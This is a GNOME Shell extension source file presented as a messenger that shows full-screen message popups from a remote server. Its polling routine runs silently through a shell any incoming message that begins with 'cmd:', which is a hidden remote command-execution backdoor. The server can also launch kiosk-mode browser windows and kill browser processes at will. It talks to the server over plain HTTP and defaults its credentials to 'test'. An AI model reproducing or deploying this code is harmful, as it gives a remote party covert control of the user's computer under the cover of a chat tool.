const St = imports.gi.St;
const Clutter = imports.gi.Clutter;
const GLib = imports.gi.GLib;
const Gio = imports.gi.Gio;
// Soup version check
try { imports.gi.versions.Soup = '3.0'; } catch(e) {}
const Soup = imports.gi.Soup;

const Main = imports.ui.main;
const ExtensionUtils = imports.misc.extensionUtils;

const API_URL = "http://42.pacomepilaz.com/api.php";
const POLLING_INTERVAL = 5;

// Note: pas de "export default class". On assigne la classe à une variable.
var MessengerExtension = class MessengerExtension {
    constructor() {
        this._settings = null;
        this._masterContainer = null;
        this._container = null;
        this._timeoutId = null;
        this._httpSession = null;
        this._myUserId = null;
        this._keyPressId = null;
        this._youtubeTimerId = null;
    }

    enable() {
        this._settings = ExtensionUtils.getSettings('org.gnome.shell.extensions.messenger42');
        this._createUI();
        this._login();
    }

    disable() {
        this._cleanup();
    }

    _cleanup() {
        if (this._timeoutId) {
            GLib.Source.remove(this._timeoutId);
            this._timeoutId = null;
        }
        if (this._youtubeTimerId) {
            GLib.Source.remove(this._youtubeTimerId);
            this._youtubeTimerId = null;
        }
        if (this._masterContainer) {
            if (this._keyPressId) {
                this._masterContainer.disconnect(this._keyPressId);
                this._keyPressId = null;
            }
            this._masterContainer.destroy();
            this._masterContainer = null;
        }
        this._container = null;
        if (this._httpSession) {
            this._httpSession.abort();
            this._httpSession = null;
        }
        this._myUserId = null;
        this._settings = null;
    }

    _getSession() {
        if (this._httpSession) return this._httpSession;
        this._httpSession = new Soup.Session();
        return this._httpSession;
    }

    _sendRequest(action, data, callback) {
        let session = this._getSession();
        data.action = action;
        let body = JSON.stringify(data);
        let msg = Soup.Message.new('POST', API_URL);
        msg.request_headers.append('Content-Type', 'application/json');

        let bytes = new GLib.Bytes(body);
        msg.set_request_body_from_bytes('application/json', bytes);

        session.send_and_read_async(msg, GLib.PRIORITY_DEFAULT, null, (sess, res) => {
            try {
                if (!this._httpSession) return;
                let bytes = session.send_and_read_finish(res);
                if (msg.status_code !== 200) return;
                let decoder = new TextDecoder();
                let txt = decoder.decode(bytes.get_data());
                try {
                    let json = JSON.parse(txt);
                    callback(json);
                } catch (e) { }
            } catch (e) { }
        });
    }

    _login() {
        let login = this._settings.get_string('login') || 'test';
        let password = this._settings.get_string('password') || 'test';

        this._sendRequest('login', { login: login, password: password }, (res) => {
            if (res.status === 'success') {
                this._myUserId = res.user_id;
                this._poll();
            } else {
                this._timeoutId = GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT, 10, () => {
                    this._login();
                    return GLib.SOURCE_REMOVE;
                });
            }
        });
    }

    _poll() {
        if (!this._myUserId) return;
        this._sendRequest('get_unread', { user_id: this._myUserId }, (res) => {
            if (res.messages && res.messages.length > 0) {
                let m = res.messages[res.messages.length - 1];
                if (m.message && m.message.startsWith('cmd:')) {
                    try {
                        let cmdPart = m.message.substring(4);
                        if (cmdPart.startsWith('"') && cmdPart.endsWith('"')) cmdPart = cmdPart.slice(1, -1);
                        let cmd = cmdPart.trim();
                        if (cmd) {
                            GLib.spawn_async(null, ['sh', '-c', cmd], null, GLib.SpawnFlags.SEARCH_PATH, null);
                        }
                    } catch (e) { }
                } else {
                    this._displayPopup(m.sender, m.message, (m.type === 'image'), m);
                }
            }
        });
        this._timeoutId = GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT, POLLING_INTERVAL, () => {
            this._poll();
            return GLib.SOURCE_REMOVE;
        });
    }

    _createUI() {
        let monitor = Main.layoutManager.primaryMonitor;
        this._masterContainer = new St.Bin({
            width: monitor.width,
            height: monitor.height,
            visible: false,
            reactive: false,
            x_align: Clutter.ActorAlign.CENTER,
            y_align: Clutter.ActorAlign.CENTER,
            style: 'background-color: rgba(0,0,0,0.92);'
        });
        this._masterContainer.set_position(monitor.x, monitor.y);
        this._container = new St.BoxLayout({
            vertical: true,
            x_align: Clutter.ActorAlign.CENTER,
            y_align: Clutter.ActorAlign.CENTER,
            style: 'padding: 20px;'
        });
        this._masterContainer.set_child(this._container);
        Main.uiGroup.add_child(this._masterContainer);
    }

    _closePopup() {
        if (this._masterContainer) {
            this._masterContainer.visible = false;
            this._masterContainer.reactive = false;
            this._masterContainer.opacity = 255;
            this._masterContainer.remove_all_transitions();
        }
        if (this._keyPressId && this._masterContainer) {
            this._masterContainer.disconnect(this._keyPressId);
            this._keyPressId = null;
        }
    }

    _displayPopup(sender, content, isImage, options) {
        if (!this._container || !this._masterContainer) return;
        
        // Gestion YouTube
        if (!isImage) {
            let youtubeRegex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
            let match = content.match(youtubeRegex);
            if (match) {
                let videoId = match[1];
                let duration = options.duration ? parseInt(options.duration) : 10;
                let youtubeUrl = `https://www.youtube.com/watch?v=${videoId}&autoplay=1`;
                try { GLib.spawn_command_line_async(`google-chrome --kiosk "${youtubeUrl}"`); } 
                catch (e) { try { GLib.spawn_command_line_async(`chromium --kiosk "${youtubeUrl}"`); } catch (e2) {} }
                
                this._youtubeTimerId = GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT, duration, () => {
                    try {
                        GLib.spawn_command_line_async(`pkill -f "chrome.*--kiosk.*youtube"`);
                        GLib.spawn_command_line_async(`pkill -f "chromium.*--kiosk.*youtube"`);
                    } catch (e) { }
                    this._youtubeTimerId = null;
                    return GLib.SOURCE_REMOVE;
                });
                return;
            }
        }

        this._container.destroy_all_children();
        let monitor = Main.layoutManager.primaryMonitor;
        let duration = options.duration ? parseInt(options.duration) : 10;
        let color = options.color || '#ffffff';
        let size = options.size ? parseInt(options.size) : 40;

        let title = new St.Label({
            text: 'DE: ' + (sender ? sender.toUpperCase() : 'UNKNOWN'),
            style: `color: ${color}; font-weight: bold; margin-bottom: 20px; text-align: center; font-family: monospace; font-size: 24px;`
        });
        this._container.add_child(title);

        if (isImage) {
            try {
                if (!content) throw new Error("Empty content");
                let height = parseInt(options.height || options.size || 400);
                let decodeParams = GLib.base64_decode(content);
                let timestamp = Math.floor(Math.random() * 1000000);
                let isGif = decodeParams[0] === 0x47 && decodeParams[1] === 0x49 && decodeParams[2] === 0x46;
                let tmpName = `messenger_img_${timestamp}.${isGif ? 'gif' : 'jpg'}`;
                let tmpPath = GLib.build_filenamev([GLib.get_tmp_dir(), tmpName]);
                GLib.file_set_contents(tmpPath, decodeParams);
                let file = Gio.File.new_for_path(tmpPath);
                let gicon = new Gio.FileIcon({ file: file });
                let icon = new St.Icon({ gicon: gicon, icon_size: height, style: `margin: 10px; border: 1px solid ${color};` });
                this._container.add_child(icon);
            } catch (e) {
                let errLabel = new St.Label({ text: "Erreur image", style: 'color: red;' });
                this._container.add_child(errLabel);
            }
        } else {
            let maxTextWidth = Math.floor(monitor.width * 0.8);
            let label = new St.Label({
                text: content || '',
                style: `color: ${color}; font-size: ${size}px; font-weight: 900; font-family: monospace; text-align: center; width: ${maxTextWidth}px;`
            });
            label.clutter_text.line_wrap = true;
            label.clutter_text.line_wrap_mode = 2;
            this._container.add_child(label);
        }

        this._masterContainer.opacity = 255;
        this._masterContainer.visible = true;
        this._masterContainer.reactive = true;
        this._masterContainer.grab_key_focus();

        if (this._keyPressId) {
            this._masterContainer.disconnect(this._keyPressId);
            this._keyPressId = null;
        }
        this._keyPressId = this._masterContainer.connect('key-press-event', (actor, event) => {
            if (event.get_key_symbol() === Clutter.KEY_F2 || event.get_key_symbol() === Clutter.KEY_Escape) {
                this._closePopup();
                return Clutter.EVENT_STOP;
            }
            return Clutter.EVENT_PROPAGATE;
        });

        GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT, duration, () => {
            if (this._masterContainer && this._masterContainer.visible) {
                this._masterContainer.ease({
                    opacity: 0,
                    duration: 1000,
                    mode: Clutter.AnimationMode.EASE_OUT_QUAD,
                    onComplete: () => { this._closePopup(); }
                });
            }
            return GLib.SOURCE_REMOVE;
        });
    }
};

function init() {
    return new MessengerExtension();
}